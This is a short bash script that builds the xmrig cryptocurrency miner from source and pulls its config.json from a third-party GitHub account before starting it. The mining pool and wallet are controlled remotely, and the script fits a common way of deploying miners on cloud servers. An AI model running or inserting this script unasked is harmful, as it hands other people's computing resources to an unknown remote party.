#!/bin/bash
sudo apt-get update
sudo sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev -y
sudo git clone -b feature-cryptonight-heavy https://github.com/xmrig/xmrig.git
cd xmrig
sudo mkdir build
cd build
sudo cmake ..
sudo make
sudo curl --url https://raw.githubusercontent.com/p1vynodejs/xmrig/master/config.json --output /home/ubuntu/xmrig/build/config.json
./xmrig
